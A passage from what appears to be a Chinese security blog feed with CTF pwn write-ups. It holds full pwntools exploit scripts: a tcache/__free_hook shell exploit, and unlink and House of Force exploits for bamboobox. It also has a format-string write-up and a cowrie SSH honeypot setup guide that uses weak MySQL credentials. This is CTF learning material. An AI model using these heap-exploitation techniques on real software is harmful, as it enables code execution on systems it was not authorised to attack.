class="line">    Alloc(<span class="number">0xf0</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Delete() </span><br><span class="line">    Delete() </span><br><span class="line">    Alloc(<span class="number">0xf0</span>,p64(<span class="number">0xabcda010</span>))</span><br><span class="line">    Alloc(<span class="number">0xf0</span>,<span class="string">'a\n'</span>)</span><br><span class="line">    Alloc(<span class="number">0xf0</span>,<span class="string">'b\n'</span>)</span><br><span class="line">    Delete() </span><br><span class="line">    <span class="comment">#unsorted bin =&gt; 0xabcda000</span></span><br><span class="line">    <span class="comment">#tcache dup to malloc unsorted bin</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    Alloc(<span class="number">0x90</span>,<span class="string">'a\n'</span>)<span class="comment">#malloced from unsorted bin =&gt; new unsorted bin:0xabcda0a0</span></span><br><span class="line">    <span class="comment">#tcache </span></span><br><span class="line">    Delete() </span><br><span class="line">    Delete() </span><br><span class="line">    <span class="comment">#(0xa0)   tcache_entry[8]: 0xabcda010 --&gt; 0xabcda010 (overlap chunk with 0xabcda000(freed) )</span></span><br><span class="line">    Alloc(<span class="number">0x90</span>,p64(<span class="number">0xabcda0b0</span>))</span><br><span class="line">    <span class="comment">#(0xa0)   tcache_entry[8]: 0xabcda010 --&gt; 0xabcda0b0 (overlap chunk with 0xabcda0a0(freed) )</span></span><br><span class="line">    Alloc(<span class="number">0x40</span>,<span class="string">'\x60\x67'</span>)<span class="comment">#0xabcda0b0 =&gt; overwrite last 2 bytes</span></span><br><span class="line">    <span class="comment">#(0xa0)   tcache_entry[8]: 0xabcda010 --&gt; 0xabcda0b0</span></span><br><span class="line">    Alloc(<span class="number">0x90</span>,<span class="string">'c\n'</span>)<span class="comment">#chunk addr =&gt; 0xabcda000</span></span><br><span class="line">    <span class="comment">#(0xa0)   tcache_entry[8]: 0xabcda0b0</span></span><br><span class="line">    Alloc(<span class="number">0x90</span>,<span class="string">'d\n'</span>)<span class="comment">#chunk addr =&gt; 0xabcda0a0</span></span><br><span class="line">    <span class="comment">#(0xa0)   tcache_entry[8]: 0x7ffff7dd6760</span></span><br><span class="line">    payload = p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">'\x00'</span></span><br><span class="line">    Alloc(<span class="number">0x90</span>,payload)</span><br><span class="line">    p.recvn(<span class="number">8</span>)</span><br><span class="line">    <span class="comment">#leak libc</span></span><br><span class="line">    leaked_addr = u64(p.recvn(<span class="number">8</span>))</span><br><span class="line">    log.success(<span class="string">'leaked addr =&gt; '</span> + hex(leaked_addr))</span><br><span class="line">    libc_base = leaked_addr - <span class="number">0x3ed8b0</span></span><br><span class="line">    log.success(<span class="string">'libc base =&gt; '</span> + hex(libc_base))</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">"__free_hook"</span>]</span><br><span class="line">    shell_addr = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    Alloc(<span class="number">0x50</span>,<span class="string">'xmzyshypnc'</span>)</span><br><span class="line">    Delete() </span><br><span class="line">    Delete() </span><br><span class="line">    Alloc(<span class="number">0x50</span>,p64(free_hook))</span><br><span class="line">    Alloc(<span class="number">0x50</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">    Alloc(<span class="number">0x50</span>,p64(shell_addr))</span><br><span class="line">    Delete()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>TSCTF2019</category>
      </categories>
  </entry>
  <entry>
    <title>bamboobox</title>
    <url>/2020/09/03/bamboobox/</url>
    <content><![CDATA[<h1 id="bamboobox"><a href="#bamboobox" class="headerlink" title="bamboobox"></a>bamboobox</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>渗透测试真是恼人，WEB好难，被360吊打，还是回来继续学PWN，争取五一刷完Hitcon-Training，这个题不是很难，但是有两种方法可以解，自己做的时候只想到一种，这里记录一下，因为第二种简单太多了。</p>
<h2 id="程序逻辑"><a href="#程序逻辑" class="headerlink" title="程序逻辑"></a>程序逻辑</h2><p>程序主要有5个功能，Show、Add、Change、Remove和Exit，其中main退出的时候会调用开始malloc的chunk的goodbye_message函数，初步思路是覆盖这个chunk的内容为magic_addr，退出即可</p>
<p><img src="/2020/09/03/bamboobox/1.jpg" alt="main"></p>
<p>Show函数可以用来泄露地址</p>
<p><img src="/2020/09/03/bamboobox/2.jpg" alt="show"></p>
<p><img src="/2020/09/03/bamboobox/3.jpg" alt="add"></p>
<p><img src="/2020/09/03/bamboobox/4.jpg" alt="remove"></p>
<p>Change函数里有堆溢出</p>
<p><img src="/2020/09/03/bamboobox/5.jpg" alt="change"></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h3><p>第一种方法是Unlink，先分配3个堆块，构造一个small chunk,chunk的结构如下:<br>prev_size-&gt;0<br>size-&gt;0x20<br>fd:p-0x18<br>bk:p-0x10<br>prev_size-&gt;0x20(绕过next_chunk的size检查)<br>nextchunk_prev_size-&gt;0x30(定位到fake chunk)<br>next_chunk_size-&gt;size(末尾为0,表明为空闲块)</p>
<h3 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h3><p>第二个方法是House of Force，在wiki里学过，思路是先分配一个chunk，溢出到top_chunk，改为<br>prev_size:0<br>size:-1<br>之后Malloc(-distance)，distance是top_chunk到第一个chunk的距离，之后再分配chunk就会使用第一个函数所在的chunk，造成覆盖</p>
<h2 id="exp-py"><a href="#exp-py" class="headerlink" title="exp.py"></a>exp.py</h2><h3 id="unlink-py"><a href="#unlink-py" class="headerlink" title="unlink.py"></a>unlink.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">"DEBUG"</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line"><span class="comment">#elf = ELF('./bamboobox')</span></span><br><span class="line"><span class="comment">#libc = ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">AddItem</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter the length of item name:'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter the name of item:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RemoveItem</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter the index of item:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ShowItem</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeItem</span><span class="params">(index,new_len,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter the index of item:'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter the length of item name:'</span>)</span><br><span class="line">    p.sendline(str(new_len))</span><br><span class="line">    p.recvuntil(<span class="string">'Please enter the new name of the item:'</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice:'</span>)</span><br><span class="line">    p.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    magic_addr = <span class="number">0x400d49</span></span><br><span class="line">    AddItem(<span class="number">0x100</span>,<span class="string">'a'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)<span class="comment">#idx 0</span></span><br><span class="line">    AddItem(<span class="number">0x30</span>,<span class="string">'b'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)<span class="comment">#idx 1</span></span><br><span class="line">    AddItem(<span class="number">0x80</span>,<span class="string">'c'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)<span class="comment">#idx 2</span></span><br><span class="line">    AddItem(<span class="number">0x10</span>,<span class="string">'d'</span>*<span class="number">7</span>+<span class="string">'\n'</span>)</span><br><span class="line">    <span class="comment">#overflow</span></span><br><span class="line">    item_list = <span class="number">0x6020c0</span></span><br><span class="line">    fd = (item_list+<span class="number">0x18</span>) - <span class="number">24</span></span><br><span class="line">    bk = (item_list+<span class="number">0x18</span>) - <span class="number">16</span></span><br><span class="line">    payload = p64(<span class="number">0x0</span>)+p64(<span class="number">0x20</span>)+p64(fd)+p64(bk)+p64(<span class="number">0x20</span>)</span><br><span class="line">    payload += (<span class="number">0x30</span>-len(payload)) * <span class="string">'a'</span></span><br><span class="line">    payload += p64(<span class="number">0x30</span>)+p64(<span class="number">0x90</span>)</span><br><span class="line">    ChangeItem(<span class="number">1</span>,len(payload),payload)</span><br><span class="line">    RemoveItem(<span class="number">2</span>)</span><br><span class="line">    ChangeItem(<span class="number">1</span>,<span class="number">0x10</span>,<span class="string">'x'</span>*<span class="number">8</span>+p64(item_list+<span class="number">0x38</span>))</span><br><span class="line">    ShowItem()</span><br><span class="line">    p.recvuntil(<span class="string">'0 : '</span>)</span><br><span class="line">    heap_base = u64(p.recv(<span class="number">3</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x210</span></span><br><span class="line">    log.success(<span class="string">'heap base =&gt; '</span> + hex(heap_base))</span><br><span class="line">    ChangeItem(<span class="number">1</span>,<span class="number">0x20</span>,p64(<span class="number">0x20</span>)+p64(heap_base+<span class="number">0x18</span>))</span><br><span class="line">    ChangeItem(<span class="number">0</span>,<span class="number">0x10</span>,p64(magic_addr))</span><br><span class="line">    Exit()</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
<h3 id="house-of-force-py"><a href="#house-of-force-py" class="headerlink" title="house-of-force.py"></a>house-of-force.py</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwnpwnpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">host = <span class="string">"training.pwnable.tw"</span></span><br><span class="line">port = <span class="number">11011</span></span><br><span class="line"></span><br><span class="line">r = remote(host,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">additem</span><span class="params">(length,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modify</span><span class="params">(idx,length,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(length))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400d49</span></span><br><span class="line">additem(<span class="number">0x60</span>,<span class="string">"ddaa"</span>)</span><br><span class="line">modify(<span class="number">0</span>,<span class="number">0x70</span>,<span class="string">"a"</span>*<span class="number">0x60</span> + p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>))</span><br><span class="line">additem(<span class="number">-160</span>,<span class="string">"dada"</span>)</span><br><span class="line">additem(<span class="number">0x20</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Hitcon-Training</category>
      </categories>
  </entry>
  <entry>
    <title>believeMe</title>
    <url>/2020/09/03/believeMe/</url>
    <content><![CDATA[<p>#<br>noxCTF–believeMe</p>
<p>##<br>漏洞分析</p>
<p>文件放在IDA里一键F5，找到main函数，提示输出之后一个fgets最多可以输入39个字节，在输入字符串的末尾补\x0，用户的输入直接作为printf的参数，这里是格式化字符串漏洞，可以造成地址任意写。后面的canary保护导致不能随便溢出，在这里以printf为突破口</p>
<p><img src="/2020/09/03/believeMe/1.jpg" alt="main"></p>
<p>##<br>漏洞利用</p>
<p>程序中有个函数叫noxFlag，里面是读flag的函数，因此只要控制eip跳转到这里即可。printf利用时可以用覆盖got表，也可以用覆盖返回地址的方式。在这里首先尝试覆盖返回地址。</p>
<p>断点下在printf，第一次的输入字符为’AAAA’+’%p’*17+’AA’，在Gdb中find 0x41414141找到AAAA所在的地址，再使用fmtarg找到参数的偏移，结果为10，实际上为%9$n。</p>
<p><img src="/2020/09/03/believeMe/2.jpg" alt="offset"></p>
<p>下面需要想办法泄露出存储返回地址的栈地址，依然是在刚才的断点处，stack 50看下此时的栈上情况，可以看到libc_start_main+241那里就是返回地址，可以是0xffc971cc也可以是0xffc971dc，这里选择后者，这个栈地址要泄露出来，需要栈上另一个存储了相关地址，根据这个地址计算出来即可（因为没有ASLR所以地址固定）。在偏移为84的地方有一个栈地址存储的内容和返回地址栈地址之间的差为4，即泄露的地址减4即为栈地址。继续使用fmtarg 得到字符串的偏移为22，这个偏移是相对于函数来说，因此相对于字符串参数的偏移为21，使用%21$p打印出这个栈地址，减去4得到返回地址所在的栈地址，再覆盖这个地址里的内容跳转到目标函数</p>
<p><img src="/2020/09/03/believeMe/3.jpg" alt="return_addr"></p>
<p><img src="/2020/09/03/believeMe/4.jpg" alt="leak_offset"></p>
<p>##<br>exp.py<br>之前写的exp今天执行报错，所以换了官方的wp代码。尴尬地是代码也挂了，payload都是一样的，可能是网络连通的问题</p>
<p><img src="/2020/09/03/believeMe/5.jpg" alt="exp"></p>
<p><img src="/2020/09/03/believeMe/6.jpg" alt="flag"></p>
]]></content>
      <categories>
        <category>noxCTF</category>
      </categories>
  </entry>
  <entry>
    <title>基于cowrie的SSH蜜罐搭建</title>
    <url>/2020/09/03/cowrie/</url>
    <content><![CDATA[<h1 id="基于cowrie的SSH蜜罐搭建"><a href="#基于cowrie的SSH蜜罐搭建" class="headerlink" title="基于cowrie的SSH蜜罐搭建"></a>基于cowrie的SSH蜜罐搭建</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近在实验室摸鱼，想接触一下蜜罐，遂问经验丰富的曹老师，从他那里得知了cowrie，于是查资料准备搭个简陋的出来</p>
<h2 id="基本搭建及配置"><a href="#基本搭建及配置" class="headerlink" title="基本搭建及配置"></a>基本搭建及配置</h2><p>cowrie有自己的官网，上面有安装步骤，不过是针对Debian/Ubuntu的，在我阿里云的Centos上命令不能直接使用，需要找到Centos上对应的包</p>
<h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><p>这次我们搭建的东西不是持久化的服务或者软件，因此保证物理环境的独立非常关键，cowrie提供了Docker用来Quick Star，希望简单体验的也可以直接用Docker。<br>新建用户cowrie:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo useradd -m cowrie</span><br><span class="line">sudo passwd cowrie</span><br><span class="line">su - cowrie</span><br></pre></td></tr></table></figure></p>
<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>安装依赖库:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo yum install -y git python-virtualenv openssl-devel libffi libffi-devel gcc make python-devel</span><br></pre></td></tr></table></figure></p>
<p>安装失败的authbind(选装):<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rpm -Uvh https://s3.amazonaws.com/aaronsilber/public/authbind-2.1.1-0.1.x86_64.rpm</span><br></pre></td></tr></table></figure></p>
<h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>github下载cowrie<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> http://github.com/cowrie/cowrie</span><br><span class="line"><span class="built_in">cd</span> cowrie</span><br></pre></td></tr></table></figure></p>
<h3 id="step4"><a href="#step4" class="headerlink" title="step4"></a>step4</h3><p>创建虚拟环境<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">virtualenv --python=python2 cowrie-env</span><br><span class="line"><span class="built_in">source</span> cowrie-env/bin/activate</span><br><span class="line">pip install --upgrade pip</span><br><span class="line">pip install --upgrade -r requirements.txt</span><br></pre></td></tr></table></figure></p>
<h3 id="step5"><a href="#step5" class="headerlink" title="step5"></a>step5</h3><p>这里官网的documentation里只是开了telnet，这里推荐一下一个比较完善的配置文件<a href="https://github.com/r3p3r/micheloosterhof-cowrie/blob/master/cowrie.cfg.dist" target="_blank" rel="noopener">cowrie.cfg.dist</a><br>官网的说法是cowrie.cfg.dist和cowrie.cfg都可以作为cowrie启动的配置文件，但是后者优先级更高一些，因此我们改为后者<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cp cowrie.cfg.dist cowrie.cfg</span><br></pre></td></tr></table></figure></p>
<p>刚才提到的配置文件功能很多，我们挑比较简单的SSH蜜罐来配置<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[honeypot]</span></span><br><span class="line"><span class="attr">hostname</span> = Carter                     <span class="comment">#主机名                     </span></span><br><span class="line"><span class="attr">log_path</span> = log                          <span class="comment">#日志路径                   </span></span><br><span class="line"><span class="attr">download_path</span> = dl                   <span class="comment">#上传文件的目录           </span></span><br><span class="line"><span class="attr">data_path</span> = data                       <span class="comment">#数据目录，里面的userdb.txt保存了用户登录的弱口令，当攻击者  SSH登录符合其中规则时即可成功进入蜜罐 </span></span><br><span class="line"><span class="attr">contents_path</span> = honeyfs             <span class="comment">#存储蜜罐里的配置文件，如passwd和shadow等    </span></span><br><span class="line"><span class="attr">filesystem_file</span> = data/fs.pickle      <span class="comment">#蜜罐的文件系统</span></span><br><span class="line"><span class="attr">txtcmds_path</span> = txtcmds              <span class="comment">#攻击者可以在蜜罐中执行的命令</span></span><br><span class="line"><span class="attr">ttylog</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">interactive_timeout</span> = <span class="number">180</span></span><br><span class="line"><span class="attr">backend</span> = shell</span><br><span class="line"><span class="attr">auth_class</span> = UserDB</span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span>                  </span><br><span class="line"><span class="attr">rsa_public_key</span> = etc/ssh_host_rsa_key.pub</span><br><span class="line"><span class="attr">rsa_private_key</span> = etc/ssh_host_rsa_key</span><br><span class="line"><span class="attr">dsa_public_key</span> = etc/ssh_host_dsa_key.pub</span><br><span class="line"><span class="attr">dsa_private_key</span> = etc/ssh_host_dsa_key</span><br><span class="line"><span class="attr">version</span> = SSH-<span class="number">2.0</span>-OpenSSH_6.<span class="number">0</span>p1 Debian-<span class="number">4</span>+deb7u2</span><br><span class="line"><span class="attr">listen_port</span> = <span class="number">60001</span>                    <span class="comment">#实际蜜罐SSH的监听端口即重定向的端口        </span></span><br><span class="line"><span class="attr">listen_endpoints</span> = tcp:<span class="number">60001</span>:interface=<span class="number">0.0</span>.<span class="number">0.0</span>  </span><br><span class="line"><span class="attr">sftp_enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">forwarding</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">forward_redirect</span> = <span class="literal">false</span></span><br><span class="line"><span class="section">[telnet]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">false</span>         </span><br><span class="line"><span class="attr">listen_endpoints</span> = tcp:<span class="number">2223</span>:interface=<span class="number">0.0</span>.<span class="number">0.0</span></span><br><span class="line"><span class="section">[output_hpfeeds]</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">server</span> = hpfeeds.mysite.org</span><br><span class="line"><span class="attr">port</span> = <span class="number">10000</span></span><br><span class="line"><span class="attr">identifier</span> = abc123</span><br><span class="line"><span class="attr">secret</span> = secret</span><br><span class="line"><span class="attr">debug</span>=<span class="literal">false</span></span><br><span class="line"><span class="section">[output_jsonlog]</span></span><br><span class="line"><span class="attr">logfile</span> = log/cowrie.json</span><br><span class="line"><span class="section">[output_mysql]</span>                      <span class="comment">#mysql配置</span></span><br><span class="line"><span class="attr">enabled</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">host</span> = localhost</span><br><span class="line"><span class="attr">database</span> = cowrie</span><br><span class="line"><span class="attr">username</span> = cowrie</span><br><span class="line"><span class="attr">password</span> = yourpassword</span><br><span class="line"><span class="attr">port</span> = <span class="number">3306</span></span><br></pre></td></tr></table></figure></p>
<h3 id="step6"><a href="#step6" class="headerlink" title="step6"></a>step6</h3><p>因为我们把SSH的22端口用来作为蜜罐端口，要把ssh的实际端口修改一下，以便我们自己登录，看之前blog里说nmap扫描的默认端口是到60000，因此我们设置其端口为60002，重启一下服务即可看到ssh的端口修改成功<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">Port 60002</span><br></pre></td></tr></table></figure></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart sshd</span><br><span class="line">netstat -nultpn</span><br></pre></td></tr></table></figure>
<h3 id="step7"><a href="#step7" class="headerlink" title="step7"></a>step7</h3><p>这里我们用的数据库是最简单的MySQL，上手比较容易，对于高并发大数据量的情景可以使用ES。<br>因为MySQL的密码强度要求，我们先修改一下MySQL的设置，在Centos下，它位于/etc/my.cnf<br><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="section">[mysqld]</span></span><br><span class="line"><span class="attr">ql_mode</span>=IGNORE_SPACE,NO_ZERO_IN_DATE,NO_ZERO_DATE,ERROR_FOR_DIVISION_BY_ZERO,NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION</span><br></pre></td></tr></table></figure></p>
<p>之后拿root登录，创建一个用户cowrie并且将权限赋予它<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> validate_password_length = <span class="number">6</span>;<span class="keyword">SET</span> <span class="keyword">GLOBAL</span> validate_password_number_count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> validate_password_policy=<span class="keyword">LOW</span>;</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">User</span> <span class="string">'cowrie@localhost'</span> <span class="keyword">Identified</span> <span class="keyword">By</span> <span class="string">'cowrie'</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> cowrie@localhost <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">'cowrie'</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure>
<p>cowrie自带了sql的表，我们可以直接导入<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /home/cowrie/cowrie/doc/sql/</span><br></pre></td></tr></table></figure></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">database</span> cowrie;</span><br><span class="line"><span class="keyword">use</span> cowrie;</span><br><span class="line">source ./mysql.sql;</span><br></pre></td></tr></table></figure>
<h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>在cowrie文件夹的Bin目录下可以直接使用start启动<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bin/cowrie start</span><br><span class="line">tail -f ./<span class="built_in">log</span>/cowrie.log</span><br></pre></td></tr></table></figure></p>
<h2 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h2><p>由于我们配置的时候多采用默认的配置，导致一些设置对于攻击者来说很容易看出是cowrie布置的蜜罐，蜜罐的交互性越低诱惑性就越低，因此我们要尽量布置的真实一点，其中一个比较明显的特点就是cowrie的配置家目录和用户都是richard，至少先把这里改一下，使用Grep搜索本目录下所有关于richard的部分，改为Carter，替换可以用vim，全局替换<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> ./cowrie</span><br><span class="line">grep -rn <span class="string">"richard"</span> .</span><br></pre></td></tr></table></figure></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">:/<span class="number">1</span>,$s/richard/Carter</span><br></pre></td></tr></table></figure>
<h2 id="可视化"><a href="#可视化" class="headerlink" title="可视化"></a>可视化</h2><p>cowrie作为一个比较经典的蜜罐有很多针对其的可视化工具，这里就介绍最简单的一种——kippo-graph，顾名思义它本当是Kippo的可视化工具，不过cowrie也可以用</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>这里使用apache作为Web服务器<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">yum install -y httpd php70w-mysql php70w-gd php70w-curl</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/ikoniaris/kippo-graph.git</span><br><span class="line">cp -R ./kippo-graph/ /var/www/html/</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line"><span class="built_in">cd</span> kippo-graph</span><br><span class="line">chmod 777 generated-graphs</span><br><span class="line">cp config.php.dist config.php</span><br></pre></td></tr></table></figure></p>
<p>修改config.php的参数为自己数据库的信息<br><figure class="highlight"><table><tr><td class="code"><pre><span class="line">define('DB_HOST', 'localhost');</span><br><span class="line">define('DB_USER', 'cowrie');</span><br><span class="line">define('DB_PASS', 'PASSWORD HERE');</span><br><span class="line">define('DB_NAME', 'cowrie');</span><br><span class="line">define('DB_PORT', '3306');</span><br></pre></td></tr></table></figure></p>
<p>直接查看网页发现有报错，为mysql connect的错误，查错的日志为/var/log/httpd/error_log，这里排错排了很多，包括Php版本不对，缺少一些Php库，不一而足，查google改即可，另外可以写一些测试的php文件帮助排错</p>
<h3 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h3><p><img src="/2020/09/03/cowrie/kippo.jpg" alt="image"></p>
]]></content>
      <categories>
        <category>honeypot</category>
      </categories>
  </entry>
  <entry>
    <title>ciscn2020_half</title>
    <url>/2020/09/22/ciscn2020-half/</url>
    <content><![CDATA[<h1 id="2020年大学生信息安全竞赛华北赛区半决赛部分pwn题"><a href="#2020年大学生信息安全竞赛华北赛区半决赛部分pwn题" class="headerlink" title="2020年大学生信息安全竞赛华北赛区半决赛部分pwn题"></a>2020年大学生信息安全竞赛华北赛区半决赛部分pwn题</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>比赛的第一天在钓鱼，题目基本都是胡哥做的修的，挑两个印象比较深的记一下。</p>
